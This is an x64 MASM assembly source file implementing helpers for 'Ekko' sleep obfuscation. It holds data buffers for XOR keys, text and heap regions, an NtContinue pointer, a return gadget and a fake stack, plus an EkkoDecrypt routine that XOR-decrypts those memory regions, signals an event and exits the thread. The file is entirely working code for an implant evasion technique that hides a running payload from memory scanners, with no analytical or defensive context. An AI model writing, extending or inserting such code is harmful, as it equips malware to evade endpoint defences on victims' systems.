; Ekko sleep obfuscation helpers (x64 MASM).

.data
PUBLIC ekkoCtxB
PUBLIC ekkoKey
PUBLIC ekkoText
PUBLIC ekkoSize
PUBLIC ekkoHeapKey
PUBLIC ekkoHeapText
PUBLIC ekkoHeapSize
PUBLIC ekkoNtContinue
PUBLIC ekkoRetGadget
PUBLIC ekkoFakeStackTop
PUBLIC ekkoEvent
PUBLIC ekkoSetEvent
PUBLIC ekkoExitThread
PUBLIC ekkoFakeStack

ALIGN 16
ekkoCtxB       DB 1232 DUP(0)
ALIGN 16
ekkoKey        DB 16 DUP(0)
ekkoText       QWORD 0
ekkoSize       QWORD 0
ALIGN 16
ekkoHeapKey    DB 16 DUP(0)
ekkoHeapText   QWORD 0
ekkoHeapSize   QWORD 0
ekkoNtContinue QWORD 0
ekkoRetGadget  QWORD 0
ekkoFakeStackTop QWORD 0
ekkoEvent      QWORD 0
ekkoSetEvent   QWORD 0
ekkoExitThread QWORD 0
ALIGN 16
ekkoFakeStack  DB 4096 DUP(0)

.code
PUBLIC EkkoDecrypt

EkkoDecrypt PROC
    mov     rcx, [ekkoText]
    mov     rdx, [ekkoSize]
    test    rcx, rcx
    jz      L2
    xor     r8, r8
L0:
    cmp     r8, rdx
    jae     L1
    mov     rax, r8
    and     rax, 15
    mov     al, BYTE PTR [ekkoKey + rax]
    xor     BYTE PTR [rcx + r8], al
    inc     r8
    jmp     L0
L1:
    mov     rcx, [ekkoHeapText]
    mov     rdx, [ekkoHeapSize]
    test    rcx, rcx
    jz      L2
    xor     r8, r8
L3:
    cmp     r8, rdx
    jae     L2
    mov     rax, r8
    and     rax, 15
    mov     al, BYTE PTR [ekkoHeapKey + rax]
    xor     BYTE PTR [rcx + r8], al
    inc     r8
    jmp     L3
L2:
    mov     rcx, [ekkoEvent]
    call    QWORD PTR [ekkoSetEvent]
    xor     ecx, ecx
    call    QWORD PTR [ekkoExitThread]
    ret
EkkoDecrypt ENDP

END
